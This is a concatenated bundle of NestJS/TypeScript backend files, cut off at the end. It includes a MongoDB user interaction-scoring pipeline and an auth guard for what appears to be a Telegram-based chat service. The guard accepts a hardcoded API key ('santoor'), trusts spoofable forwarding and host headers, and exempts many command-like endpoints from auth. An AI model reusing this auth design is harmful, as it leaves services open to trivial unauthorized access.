throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query).lean();\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  /**\n   * Get users with top interaction scores based on saved stats in DB\n   * Uses smart filtering with proper weightages for different interaction types\n   * Movie count has negative weightage as it indicates less genuine interaction\n   * @param options - Filtering and pagination options\n   * @returns Paginated list of users sorted by interaction score\n   */\n  async getTopInteractionUsers(options: {\n    page?: number;\n    limit?: number;\n    minScore?: number;\n    minCalls?: number;\n    minPhotos?: number;\n    minVideos?: number;\n    excludeExpired?: boolean;\n    excludeTwoFA?: boolean;\n    gender?: string;\n  }): Promise<{\n    users: Array<User & { interactionScore: number }>;\n    total: number;\n    page: number;\n    limit: number;\n    totalPages: number;\n  }> {\n    const {\n      page = 1,\n      limit = 20,\n      minScore = 0,\n      minCalls = 0,\n      minPhotos = 0,\n      minVideos = 0,\n      excludeExpired = true,\n      excludeTwoFA = false,\n      gender\n    } = options;\n\n    // Validate pagination\n    const pageNum = Math.max(1, Math.floor(page));\n    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100); // Max 100 per page\n    const skip = (pageNum - 1) * limitNum;\n\n    // Weightages for interaction scoring\n    // Higher weights for own content (user-generated) vs received content\n    // Reduced call weightage as requested\n    const weights = {\n      ownPhoto: 15,           // Photos sent by user (high engagement)\n      ownVideo: 18,          // Videos sent by user (very high engagement)\n      otherPhoto: 3,         // Photos received (moderate engagement)\n      otherVideo: 5,         // Videos received (good engagement)\n      totalPhoto: 2,         // Total photos (fallback if own/other not available)\n      totalVideo: 3,         // Total videos (fallback if own/other not available)\n      incomingCall: 5,       // Incoming calls (reduced from 15)\n      outgoingCall: 3,       // Outgoing calls (reduced from 8)\n      videoCall: 8,          // Video calls (reduced from 20)\n      totalCalls: 1,         // Total calls (fallback)\n      movieCount: -5,       // NEGATIVE: Movie count indicates less genuine interaction\n    };\n\n    // Build filter query\n    const filter: any = {};\n\n    // Exclude expired users by default\n    if (excludeExpired) {\n      filter.expired = { $ne: true };\n    }\n\n    // Exclude 2FA users if requested\n    if (excludeTwoFA) {\n      filter.twoFA = { $ne: true };\n    }\n\n    // Gender filter\n    if (gender) {\n      filter.gender = gender;\n    }\n\n    // Minimum thresholds (backward compat: support both calls.totalCalls and calls.chatCallCounts length)\n    if (minCalls > 0) {\n      filter.$and = [\n        ...(filter.$and || []),\n        {\n          $or: [\n            { 'calls.totalCalls': { $gte: minCalls } },\n            { $expr: { $gte: [{ $size: { $ifNull: ['$calls.chatCallCounts', []] } }, minCalls] } },\n          ],\n        },\n      ];\n    }\n\n    if (minPhotos > 0) {\n      filter.$or = [\n        { photoCount: { $gte: minPhotos } },\n        { ownPhotoCount: { $gte: minPhotos } },\n        { otherPhotoCount: { $gte: minPhotos } }\n      ];\n    }\n\n    if (minVideos > 0) {\n      filter.$or = [\n        ...(filter.$or || []),\n        { videoCount: { $gte: minVideos } },\n        { ownVideoCount: { $gte: minVideos } },\n        { otherVideoCount: { $gte: minVideos } }\n      ];\n    }\n\n    // Use MongoDB aggregation pipeline for efficient scoring and pagination\n    // This calculates scores in the database instead of loading all users into memory\n    const pipeline: any[] = [\n      // Match stage - apply filters\n      { $match: filter },\n      \n      // Lookup session_audits to exclude users whose mobile exists in session audits\n      {\n        $lookup: {\n          from: 'session_audits',\n          localField: 'mobile',\n          foreignField: 'mobile',\n          as: 'sessionAudits'\n        }\n      },\n      \n      // Exclude users whose mobile exists in session_audits collection\n      {\n        $match: {\n          sessionAudits: { $size: 0 } // Only include users with no matching session audits\n        }\n      },\n      \n      // Remove duplicates by mobile EARLY (before scoring to reduce data volume)\n      {\n        $group: {\n          _id: '$mobile',\n          doc: { $first: '$$ROOT' }\n        }\n      },\n      \n      // Replace root with the document\n      {\n        $replaceRoot: { newRoot: '$doc' }\n      },\n      \n      // Remove the sessionAudits field\n      {\n        $project: {\n          sessionAudits: 0\n        }\n      },\n      \n      // Add calculated fields for interaction score\n      {\n        $addFields: {\n          // Photo score (prefer own > other > total)\n          photoScore: {\n            $cond: {\n              if: { $gt: ['$ownPhotoCount', 0] },\n              then: { $multiply: ['$ownPhotoCount', weights.ownPhoto] },\n              else: {\n                $cond: {\n                  if: { $gt: ['$otherPhotoCount', 0] },\n                  then: { $multiply: ['$otherPhotoCount', weights.otherPhoto] },\n                  else: {\n                    $cond: {\n                      if: { $gt: ['$photoCount', 0] },\n                      then: { $multiply: ['$photoCount', weights.totalPhoto] },\n                      else: 0\n                    }\n                  }\n                }\n              }\n            }\n          },\n          \n          // Video score (prefer own > other > total)\n          videoScore: {\n            $cond: {\n              if: { $gt: ['$ownVideoCount', 0] },\n              then: { $multiply: ['$ownVideoCount', weights.ownVideo] },\n              else: {\n                $cond: {\n                  if: { $gt: ['$otherVideoCount', 0] },\n                  then: { $multiply: ['$otherVideoCount', weights.otherVideo] },\n                  else: {\n                    $cond: {\n                      if: { $gt: ['$videoCount', 0] },\n                      then: { $multiply: ['$videoCount', weights.totalVideo] },\n                      else: 0\n                    }\n                  }\n                }\n              }\n            }\n          },\n          \n          // Call score - backward compat: totalCalls from totalCalls or size(chatCallCounts)\n          callScore: {\n            $let: {\n              vars: {\n                incomingVal: { $ifNull: ['$calls.incoming', 0] },\n                outgoingVal: { $ifNull: ['$calls.outgoing', 0] },\n                videoVal: { $ifNull: ['$calls.video', 0] },\n                totalCallsVal: {\n                  $ifNull: [\n                    '$calls.totalCalls',\n                    { $size: { $ifNull: ['$calls.chatCallCounts', []] } },\n                  ],\n                },\n              },\n              in: {\n                $add: [\n                  {\n                    $cond: {\n                      if: { $gt: ['$$incomingVal', 0] },\n                      then: { $multiply: ['$$incomingVal', weights.incomingCall] },\n                      else: 0\n                    }\n                  },\n                  {\n                    $cond: {\n                      if: { $gt: ['$$outgoingVal', 0] },\n                      then: { $multiply: ['$$outgoingVal', weights.outgoingCall] },\n                      else: 0\n                    }\n                  },\n                  {\n                    $cond: {\n                      if: { $gt: ['$$videoVal', 0] },\n                      then: { $multiply: ['$$videoVal', weights.videoCall] },\n                      else: 0\n                    }\n                  },\n                  {\n                    $cond: {\n                      if: {\n                        $and: [\n                          { $eq: ['$$incomingVal', 0] },\n                          { $eq: ['$$outgoingVal', 0] },\n                          { $gt: ['$$totalCallsVal', 0] }\n                        ]\n                      },\n                      then: { $multiply: ['$$totalCallsVal', weights.totalCalls] },\n                      else: 0\n                    }\n                  }\n                ]\n              }\n            }\n          },\n          \n          // Movie count (negative weightage)\n          movieScore: {\n            $cond: {\n              if: { $gt: ['$movieCount', 0] },\n              then: { $multiply: ['$movieCount', weights.movieCount] }, // Negative weight\n              else: 0\n            }\n          }\n        }\n      },\n      \n      // Calculate total interaction score\n      {\n        $addFields: {\n          interactionScore: {\n            $round: [\n              {\n                $divide: [\n                  {\n                    $add: [\n                      '$photoScore',\n                      '$videoScore',\n                      '$callScore',\n                      '$movieScore'\n                    ]\n                  },\n                  1\n                ]\n              },\n              2\n            ]\n          }\n        }\n      },\n      \n      // Filter by minimum score\n      {\n        $match: {\n          interactionScore: { $gte: minScore }\n        }\n      },\n      \n      // CRITICAL FIX: Limit dataset BEFORE sorting to avoid memory overflow\n      // Fetch enough for pagination but not the entire collection\n      { $limit: Math.max(10000, (pageNum * limitNum) + 1000) },\n       \n      // Sort by interaction score (descending)\n      { $sort: { interactionScore: -1 } },\n      \n      // Use $facet for count and pagination in parallel\n      {\n        $facet: {\n          totalCount: [{ $count: 'count' }],\n          paginatedResults: [\n            { $skip: skip },\n            { $limit: limitNum }\n          ]\n        }\n      }\n    ];\n\n    try {\n      const result = await this.userModel.aggregate(pipeline).allowDiskUse(true).exec();\n    \n      if (!result || result.length === 0) {\n        return {\n          users: [],\n          total: 0,\n          page: pageNum,\n          limit: limitNum,\n          totalPages: 0\n        };\n      }\n\n      const aggregationResult = result[0];\n      const totalUsers = aggregationResult.totalCount?.[0]?.count || 0;\n      const rawUsers = aggregationResult.paginatedResults || [];\n\n      // Backward compat: expose calls.chatCallCounts for consumers expecting old shape (alias from calls.chats)\n      const users = rawUsers.map((u: any) => {\n        const calls = u?.calls ?? {};\n        const hasNew = Array.isArray(calls.chats);\n        const hasOld = Array.isArray(calls.chatCallCounts);\n        const normalizedCalls = {\n          ...calls,\n          ...(hasNew && !hasOld ? { chatCallCounts: calls.chats } : {}),\n        };\n        return { ...u, calls: normalizedCalls };\n      });\n\n      const totalPages = Math.ceil(totalUsers / limitNum);\n\n      return {\n        users,\n        total: totalUsers,\n        page: pageNum,\n        limit: limitNum,\n        totalPages\n      };\n    } catch (error) {\n      console.error('Error in getTopInteractionUsers aggregation:', error);\n      throw new InternalServerErrorException(`Failed to fetch top interaction users: ${error.message}`);\n    }\n  }\n\n}\n","import { SetMetadata } from '@nestjs/common';\n\nexport const CLOUDFLARE_CACHE_KEY = 'cloudflare-cache-seconds';\n\n/**\n * @param edgeSeconds Cloudflare edge cache duration in seconds\n * @param browserSeconds Browser cache duration in seconds (default: 0)\n */\nexport const CloudflareCache = (edgeSeconds: number, browserSeconds = 0) =>\n  SetMetadata(CLOUDFLARE_CACHE_KEY, {\n    edge: edgeSeconds,\n    browser: browserSeconds,\n  });\n","export * from './cloudflare-cache.decorator'\nexport * from './no-cache.decorator'","// no-cache.decorator.ts\nimport { SetMetadata } from '@nestjs/common';\n\nexport const NO_CACHE_KEY = 'NO_CACHE';\nexport const NoCache = () => SetMetadata(NO_CACHE_KEY, true);\n","import {\n    CanActivate,\n    ExecutionContext,\n    Injectable,\n    UnauthorizedException\n} from '@nestjs/common';\nimport { Request } from 'express';\nimport { getBotsServiceInstance, Logger } from '../utils';\nimport { ChannelCategory } from '../components';\n\nconst ALLOWED_IPS = [\n    '31.97.59.2',\n    '148.230.84.50',\n    '13.228.225.19',\n    '18.142.128.26',\n    '54.254.162.138',\n];\n\nconst ALLOWED_ORIGINS = [\n    'https://paidgirl.site',\n    'https://zomcall.netlify.app',\n    'https://tgchats.netlify.app',\n    'https://tg-chats.netlify.app',\n    'https://report-upi.netlify.app',\n].map((origin) => origin.toLowerCase());\n\n/**\n * Ignored paths are evaluated in priority order:\n * 1. Exact paths first (fast)\n * 2. Regex patterns for broader matches\n */\nconst IGNORE_PATHS: (string | RegExp)[] = [\n    '/',\n    '/exit',\n    '/getProcessId',\n    '/executehs',\n    '/executehsl',\n    '/sendmessage',\n    '/asktopay',\n    '/refreshmap',\n    '/markasread',\n    '/checktghealth',\n    '/isRecentUser',\n    '/paymentstats',\n    '/sendtochannel',\n    '/joinchannel',\n    '/leavechannel',\n    '/channelinfo',\n    '/getme',\n    '/trytoconnect',\n    '/chat',\n    '/builds',\n    '/favicon.ico',\n    /^\\/userdata(?:$|\\/)/i,\n    /^\\/favicon(?:$|\\/)/i,\n    /^\\/favicon.ico(?:$|\\/)/i,\n    /^\\/blockuserall(?:$|\\/)/i,\n    /^\\/sendtoall(?:$|\\/)/i,\n    /^\\/sendtochannel(?:$|\\/)/i,\n    /^\\/apim(?:$|\\/)/i,\n    '/apim',\n    '/health',\n    /^\\/public(?:$|\\/)/i,\n];\n\n@Injectable()\nexport class AuthGuard implements CanActivate {\n    private readonly logger = new Logger(AuthGuard.name);\n\n    canActivate(context: ExecutionContext): boolean {\n        const request = context.switchToHttp().getRequest<Request>();\n\n        const path = request.path;\n        const url = request.url;\n        const originalUrl = request.originalUrl;\n\n        //  Step 1: Skip ignored paths early\n        if (this.isIgnoredPath(path, url, originalUrl)) {\n            return true;\n        }\n\n        const apiKey =\n            request.headers['x-api-key']?.toString() ||\n            request.query['apiKey']?.toString();\n\n        const clientIp = this.extractRealClientIP(request);\n        const origin = this.extractRealOrigin(request);\n\n        this.logger.debug(`Request Received: ${originalUrl}`);\n        // this.logger.debug(` Client IP: ${clientIp}`);\n        // this.logger.debug(` Origin: ${origin || 'NONE'}`);\n\n        let passedReason: string | null = null;\n\n        //  Step 2: Priority check  API Key  IP  Origin\n        if (apiKey && apiKey.toLowerCase() === 'santoor') {\n            passedReason = 'API key valid';\n        } else if (ALLOWED_IPS.includes(clientIp)) {\n            passedReason = 'IP allowed';\n        } else if (origin && this.isOriginAllowed(origin)) {\n            passedReason = 'Origin allowed';\n        }\n\n        //  Step 3: Final decision\n        if (passedReason) {\n            // this.logger.debug(` Access granted because: ${passedReason}`);\n            return true;\n        }\n\n        this.logger.warn(` Access denied  no condition satisfied`);\n        this.notifyUnauthorized(clientIp, origin, originalUrl);\n        throw new UnauthorizedException(\n            'Access denied',\n        );\n    }\n\n    private isIgnoredPath(...urls: string[]): boolean {\n        for (const urlToTest of urls.filter(Boolean)) {\n            for (const ignore of IGNORE_PATHS) {\n                if (typeof ignore === 'string') {\n                    if (ignore.toLowerCase() === urlToTest.toLowerCase()) {\n                        return true;\n                    }\n                } else if (ignore.test(urlToTest)) {\n                    return true;\n                }\n            }\n        }\n        return false;\n    }\n\n    private isOriginAllowed(origin: string): boolean {\n        try {\n            const { protocol, host } = new URL(origin.toLowerCase().trim());\n            const normalized = `${protocol}//${host}`;\n            return ALLOWED_ORIGINS.includes(normalized);\n        } catch {\n            return false;\n        }\n    }\n\n    private getHeaderValue(\n        request: Request,\n        headerName: string,\n    ): string | undefined {\n        return request.headers[headerName.toLowerCase()] as string;\n    }\n\n    private extractRealClientIP(request: Request): string {\n        // Cloudflare first\n        const cfConnectingIP = this.getHeaderValue(request, 'cf-connecting-ip');\n        if (cfConnectingIP) return cfConnectingIP;\n\n        // Nginx-provided IPs\n        const xRealIP = this.getHeaderValue(request, 'x-real-ip');\n        if (xRealIP) return xRealIP;\n\n        const xForwardedFor = this.getHeaderValue(request, 'x-forwarded-for');\n        if (xForwardedFor) return xForwardedFor.split(',')[0].trim();\n\n        // Express defaults\n        if (request.ip) return request.ip.replace('::ffff:', '');\n        if (request.connection?.remoteAddress)\n            return request.connection.remoteAddress.replace('::ffff:', '');\n\n        this.logger.warn(`Unable to extract client IP`);\n        return 'unknown';\n    }\n\n    private extractRealOrigin(request: Request): string | undefined {\n        const origin = this.getHeaderValue(request, 'origin');\n        if (origin) return origin;\n\n        const xOriginalHost = this.getHeaderValue(request, 'x-original-host');\n        if (xOriginalHost)\n            return `${this.extractProtocol(request)}://${xOriginalHost}`;\n\n        const xForwardedHost = this.getHeaderValue(request, 'x-forwarded-host');\n        if (xForwardedHost)\n            return `${this.extractProtocol(request)}://${xForwardedHost}`;\n\n        const host = this.getHeaderValue(request, 'host');\n        if (host) return `${this.extractProtocol(request)}://${host}`;\n\n        const referer = this.getHeaderValue(request, 'referer');\n        if (referer) {\n            try {\n                const refererUrl = new URL(referer);\n                return `${refererUrl.protocol}//${refererUrl.host}`;\n            } catch {\n                this.logger.debug(`Invalid referer: ${referer}`);\n            }\n        }\n\n        return undefined;\n    }\n\n    private extractProtocol(request: Request): string {\n        const xForwardedProto = this.getHeaderValue(request, 'x-forwarded-proto');\n        if (xForwardedProto) return xForwardedProto.toLowerCase();\n\n        const cfVisitor = this.getHeaderValue(request, 'cf-visitor');\n        if (cfVisitor) {\n            try {\n                const visitor = JSON.parse(cfVisitor);\n                if (visitor.scheme) return visitor.scheme.toLowerCase();\n            } catch {\n                this.logger.debug(`Failed to parse CF-Visitor`);\n            }\n        }\n\n        if (request.secure) return 'https';\n        const xForwardedSsl = this.getHeaderValue(request, 'x-forwarded-ssl');\n        if (xForwardedSsl?.toLowerCase() === 'on') return 'https';\n\n        return process.env.NODE_ENV === 'production' ? 'https' : 'http';\n    }\n\n    private notifyUnauthorized(\n        clientIp: string,\n        origin: string | undefined,\n        originalUrl: string,\n    ) {\n        try {\n            const botsService = getBotsServiceInstance();\n            if (!botsService) {\n                this.logger.warn(`BotsService instance not available for notifications`);\n                return;\n            }else{\n                botsService.sendMessageByCategory(ChannelCategory.UNAUTH_CALLS, `Unauthorized Attempt\\nip: ${clientIp || 'unknown IP'}\\norigin: ${origin || 'unknown origin'}\\npath: ${originalUrl || 'unknown path'}`);\n                return;\n            }\n        } catch (err) {\n            this.logger.error(`Notifbot failed: ${err.message}`);\n        }\n    }\n}\n","export * from './auth.guard';","import {\n    ExceptionFilter,\n    Catch,\n    ArgumentsHost,\n    HttpException,\n    HttpStatus,\n} from '@nestjs/common';\nimport { Response } from 'express';\nimport { parseError } from '../utils';\n\n@Catch()\nexport class ExceptionsFilter implements ExceptionFilter {\n    catch(exception: unknown, host: ArgumentsHost) {\n        const ctx = host.switchToHttp();\n        const response = ctx.getResponse<Response>();\n\n        const errorDetails = parseError(exception, 'Exception', false);\n        console.error(\"stack:\", exception[\"stack\"])\n\n        let status = errorDetails.status || HttpStatus.INTERNAL_SERVER_ERROR;\n        let message = errorDetails.message || 'Internal server error';\n\n        if (exception instanceof HttpException) {\n            status = exception.getStatus();\n            const errorResponse = exception.getResponse();\n            message =\n                typeof errorResponse === 'string'\n                    ? errorResponse\n                    : (errorResponse as any).message || errorResponse;\n        }\n\n        response.status(status).json({\n            statusCode: status,\n            message,\n            error: errorDetails.error\n        });\n    }\n}\n","import {\n  Injectable,\n  NestInterceptor,\n  ExecutionContext,\n  CallHandler,\n} from '@nestjs/common';\nimport { Reflector } from '@nestjs/core';\nimport { Observable } from 'rxjs';\nimport { CLOUDFLARE_CACHE_KEY } from '../decorators';\nimport { NO_CACHE_KEY } from '../decorators';\n\n@Injectable()\nexport class CloudflareCacheInterceptor implements NestInterceptor {\n  constructor(private reflector: Reflector) {}\n\n  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {\n    const res = context.switchToHttp().getResponse();\n    const noCache = this.reflector.get<boolean>(NO_CACHE_KEY, context.getHandler());\n\n    if (noCache) {\n      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');\n      res.setHeader('Pragma', 'no-cache');\n      res.setHeader('Expires', '0');\n      return next.handle();\n    }\n\n    const cacheConfig = this.reflector.get<{ edge: number; browser: number }>(\n      CLOUDFLARE_CACHE_KEY,\n      context.getHandler(),\n    );\n\n    if (cacheConfig) {\n      res.setHeader(\n        'Cache-Control',\n        `public, max-age=${cacheConfig.browser}, s-maxage=${cacheConfig.edge}`,\n      );\n    }\n\n    return next.handle();\n  }\n}\n","export * from './cloudflare-cache.interceptor'\nexport * from './Exception-filter'\nexport * from './timeout.interceptor'","import {\n  Injectable,\n  NestInterceptor,\n  ExecutionContext,\n  CallHandler,\n  RequestTimeoutException,\n} from '@nestjs/common';\nimport { Observable, throwError } from 'rxjs';\nimport { timeout, catchError } from 'rxjs/operators';\n\n@Injectable()\nexport class TimeoutInterceptor implements NestInterceptor {\n  constructor(private readonly defaultTimeout: number = 120000) {} // default = 120s\n\n  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {\n    return next.handle().pipe(\n      timeout(this.defaultTimeout),\n      catchError((err) => {\n        if (err.name === 'TimeoutError') {\n          return throwError(() => new RequestTimeoutException('Request timed out'));\n        }\n        return throwError(() => err);\n      }),\n    );\n  }\n}\n","export enum PrivacyLevelEnum {\r\n    everybody = 'everybody',\r\n    contacts = 'contacts',\r\n    nobody = 'nobody'\r\n}\r\n\r\nexport type PrivacyLevel = keyof typeof PrivacyLevelEnum;\r\n\r\nexport interface ActiveClientSetup {\r\n    days?: number;\r\n    archiveOld: boolean;\r\n    formalities: boolean;\r\n    newMobile: string;\r\n    existingMobile: string;\r\n    clientId: string;\r\n}\r\n\r\nexport interface ChatStatistics {\r\n    period: 'day' | 'week' | 'month';\r\n    totalMessages: number;\r\n    uniqueSenders: number;\r\n    messageTypes: {\r\n        text: number;\r\n        photo: number;\r\n        video: number;\r\n        voice: number;\r\n        other: number;\r\n    };\r\n    topSenders: Array<{\r\n        id: string;\r\n        count: number;\r\n    }>;\r\n    mostActiveHours: Array<{\r\n        hour: number;\r\n        count: number;\r\n    }>;\r\n}\r\n\r\nexport interface ContentFilter {\r\n    chatId: string;\r\n    keywords?: string[];\r\n    mediaTypes?: ('photo' | 'video' | 'document')[];\r\n    actions: ('delete' | 'warn' | 'mute')[];\r\n}\r\n\r\nexport interface MessageScheduleOptions {\r\n    chatId: string;\r\n    message: string;\r\n    scheduledTime: Date;\r\n    replyTo?: number;\r\n    silent?: boolean;\r\n}\r\n\r\nexport interface GroupOptions {\r\n    title: string;\r\n    members?: string[];\r\n    photo?: string;\r\n    about?: string;\r\n    address?: string;\r\n    slowMode?: number;\r\n    megagroup?: boolean;\r\n    forImport?: boolean;\r\n    memberRestrictions?: {\r\n        sendMessages?: boolean;\r\n        sendMedia?: boolean;\r\n        sendStickers?: boolean;\r\n        sendGifs?: boolean;\r\n        sendGames?: boolean;\r\n        sendInline?: boolean;\r\n        embedLinks?: boolean;\r\n    };\r\n}\r\n\r\nexport interface ChannelInfo {\r\n    chatsArrayLength: number;\r\n    canSendTrueCount: number;\r\n    canSendFalseCount: number;\r\n    ids: string[];\r\n    canSendFalseChats: string[];\r\n}\r\n\r\nexport interface ChatFolderOptions {\r\n    name: string;\r\n    includedChats: string[];\r\n    excludedChats?: string[];\r\n    includeContacts?: boolean;\r\n    includeNonContacts?: boolean;\r\n    includeGroups?: boolean;\r\n    includeBroadcasts?: boolean;\r\n    includeBots?: boolean;\r\n    excludeMuted?: boolean;\r\n    excludeRead?: boolean;\r\n    excludeArchived?: boolean;\r\n}","import { setProcessListeners } from './processListeners';\nsetProcessListeners();\nimport 'reflect-metadata';\nimport { NestFactory } from '@nestjs/core';\nimport mongoose from 'mongoose'\nimport { AppModule } from './app.module';\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\nimport { ValidationPipe } from '@nestjs/common';\nimport * as fs from 'fs';\nimport { Logger } from './utils';\nimport { ExceptionsFilter } from './interceptors/Exception-filter';\nimport { TimeoutInterceptor } from './interceptors/timeout.interceptor';\n\nasync function bootstrap() {\n  try {\n    const app = await NestFactory.create(AppModule);\n    const config = new DocumentBuilder()\n      .setTitle('NestJS and Express API')\n      .setDescription('API documentation')\n      .setVersion('1.0')\n      .addApiKey(\n        { type: 'apiKey', name: 'x-api-key', in: 'header' },\n        'x-api-key', // Security name must match everywhere\n      )\n      .build();\n\n\n    app.enableCors({\n      allowedHeaders: \"*\",\n      origin: \"*\"\n    });\n    const document = SwaggerModule.createDocument(app, config, {\n      deepScanRoutes: true,\n    });\n\n    document.components ??= {};\n    document.components.securitySchemes ??= {};\n    document.security = [{ 'x-api-key': [] }]; // Global security requirement\n    fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n    SwaggerModule.setup('apim', app, document,\n      {\n        swaggerOptions: {\n          persistAuthorization: true,\n          authAction: {\n            'x-api-key': {\n              name: 'x-api-key',\n              schema: { type: 'apiKey', in: 'header', name: 'x-api-key' },\n              value: process.env.API_KEY || 'santoor',\n            },\n          },\n        },\n      }\n    );\n    mongoose.set('debug', true)\n    app.useGlobalFilters(new ExceptionsFilter());\n    app.useGlobalInterceptors(new TimeoutInterceptor(60000));\n    app.useGlobalPipes(new ValidationPipe({\n      transform: true,\n      // whitelist: true,\n      // forbidNonWhitelisted: true,\n      transformOptions: {\n        enableImplicitConversion: true\n      },\n      // validationError: {\n      //   target: false,\n      //   value: undefined\n      // }\n    }));\n\n\n    await app.init();\n    await app.listen(process.env.PORT || 9002);\n    console.log(`Application is running on: http://localhost:${process.env.PORT || 9002}`);\n  } catch (error) {\n    console.error('Error during application bootstrap:', error);\n    process.exit(1);\n  }\n}\nbootstrap();\n","import { Injectable, NestMiddleware } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { parseError } from '../utils/parseError';\nimport { getBotsServiceInstance, Logger } from '../utils';\nimport { ChannelCategory } from '../components';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n  private readonly logger = new Logger('HTTP');\n\n  use(req: Request, res: Response, next: NextFunction): void {\n    const { method, originalUrl } = req;\n    const startTime = Date.now(); // Capture start time\n    const ip = req.ip;\n\n    const excludedEndpoints = [\n      '/sendtochannel',\n      '/favicon.',\n      '/tgsignup',\n      '/timestamps',\n    ];\n    const isExcluded = (url: string) =>\n      excludedEndpoints.some((endpoint) => url.startsWith(endpoint));\n\n    if (!isExcluded(originalUrl) && originalUrl !== '/') {\n      res.on('finish', () => {\n        const { statusCode } = res;\n        const duration = Date.now() - startTime; // Duration in ms\n        const durationStr =\n          duration >= 1000 ? `${(duration / 1000).toFixed(2)}s` : `${duration}ms`;\n        const botsService  = getBotsServiceInstance();\n        if (!botsService) {\n            this.logger.warn(`BotsService instance not available for notifications`);\n            return;\n        }\n\n        if (statusCode >= 500) {\n          botsService.sendMessageByCategory(ChannelCategory.HTTP_FAILURES, `Threw Status ${statusCode} for ${originalUrl}`);\n          this.logger.error(\n            `${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`,\n          );\n        } else if (statusCode >= 400) {\n          botsService.sendMessageByCategory(\n            ChannelCategory.HTTP_FAILURES,\n            `Threw Status ${statusCode} for ${originalUrl}`\n          );\n          this.logger.warn(\n            `${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`,\n          );\n        } else if (statusCode >= 300) {\n          this.logger.verbose(\n            `${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`,\n          );\n        } else {\n          this.logger.debug(\n            `${method} ${originalUrl} ${ip} || StatusCode: ${statusCode} || Duration: ${durationStr}`,\n          );\n        }\n      });\n\n      res.on('error', (error) => {\n        const errorDetails = parseError(error, process.env.clientId);\n        const botsService  = getBotsServiceInstance();\n        if (!botsService) {\n            this.logger.warn(`BotsService instance not available for notifications`);\n            return;\n        }\n        botsService.sendMessageByCategory(\n          ChannelCategory.HTTP_FAILURES,\n          `Error at req for ${originalUrl}\\nMessage: ${errorDetails.message}`,\n        );\n      });\n    } else {\n      if (originalUrl.includes('Video')) {\n        this.logger.log(\n          `Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`,\n        );\n      }\n    }\n\n    next();\n  }\n}\n","export function setProcessListeners() {\n  // Catch unhandled promise rejections\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error(' Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  // Catch uncaught exceptions\n  process.on('uncaughtException', (error: Error) => {\n    console.error(' Uncaught Exception:', error.stack || error);\n    process.exit(1); // Exit after logging\n  });\n\n  // Graceful shutdown\n  let isShuttingDown = false;\n  const shutdown = (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(` ${signal} received, shutting down...`);\n    process.exit(0);\n  };\n\n  // Signals\n  process.on('SIGINT', () => shutdown('SIGINT'));\n  process.on('SIGTERM', () => shutdown('SIGTERM'));\n  process.on('SIGQUIT', () => shutdown('SIGQUIT'));\n\n  // Exit\n  process.on('exit', (code) => {\n    console.log(` Application closed with exit code ${code}`);\n  });\n  console.log(\" Process listeners set up successfully\");\n}\n","import { BotsService } from '../components/bots/bots.service';\n\n// Global instance that will be set by the application\nlet botsServiceInstance: BotsService | null = null;\n\nexport function setBotsServiceInstance(instance: BotsService) {\n    botsServiceInstance = instance;\n}\n\nexport function getBotsServiceInstance(): BotsService {\n    if (!botsServiceInstance) {\n        throw new Error('BotsService instance not initialized. Make sure to call setBotsServiceInstance first.');\n    }\n    return botsServiceInstance;\n}\n","import { attemptReverseFuzzy } from \"./obfuscateText\";\n\nconst normalize = (str: string | null | undefined): string =>\n    (str || \"\")\n        .toLowerCase()\n        .trim()\n        .replace(/\\s+/g, \" \")\n        .replace(/[^\\p{L}\\p{N}@\\s]/gu, \"\")\n        .normalize(\"NFC\")\n        .replace(/[\\u200B\\u200C\\u200D\\u2060\\uFEFF]/g, \"\");\n// Safely attempt reverse fuzzy operation\nexport const safeAttemptReverse = (val: string | null | undefined): string => {\n    try {\n        return attemptReverseFuzzy(val ?? \"\") || \"\";\n    } catch {\n        return \"\";\n    }\n};\n\n// Check if strings are similar enough (lenient matching)\nconst isSimilarEnough = (actual: string, expected: string): boolean => {\n    const normalizedActual = normalize(actual);\n    const normalizedExpected = normalize(expected);\n\n    // If exact match after normalization\n    if (normalizedActual === normalizedExpected) return true;\n\n    // If one contains the other (lenient)\n    if (normalizedActual.includes(normalizedExpected) || normalizedExpected.includes(normalizedActual)) return true;\n\n    // Calculate simple similarity ratio\n    const longer = normalizedActual.length > normalizedExpected.length ? normalizedActual : normalizedExpected;\n    const shorter = normalizedActual.length > normalizedExpected.length ? normalizedExpected : normalizedActual;\n\n    if (longer.length === 0) return true; // Both empty\n\n    // Allow 30% difference\n    const editDistance = levenshteinDistance(normalizedActual, normalizedExpected);\n    const similarity = 1 - editDistance / longer.length;\n\n    return similarity >= 0.7; // 70% similar is good enough\n};\n\nconst levenshteinDistance = (str1: string, str2: string): number => {\n    const matrix = Array(str2.length + 1).fill(null).map(() => Array(str1.length + 1).fill(0));\n\n    for (let i = 0; i <= str1.length; i++) matrix[0][i] = i;\n    for (let j = 0; j <= str2.length; j++) matrix[j][0] = j;\n\n    for (let j = 1; j <= str2.length; j++) {\n        for (let i = 1; i <= str1.length; i++) {\n            const cost = str1[i - 1] === str2[j - 1] ? 0 : 1;\n            matrix[j][i] = Math.min(\n                matrix[j][i - 1] + 1,\n                matrix[j - 1][i] + 1,\n                matrix[j - 1][i - 1] + cost\n            );\n        }\n    }\n\n    return matrix[str2.length][str1.length];\n};\nexport const isIncludedWithTolerance = (actual: string, expected: string, maxDiff = 2): boolean => {\n    if (!expected) return true;\n    if (!actual) return false;\n\n    const normActual = normalize(actual);\n    const normExpected = normalize(expected);\n\n    if 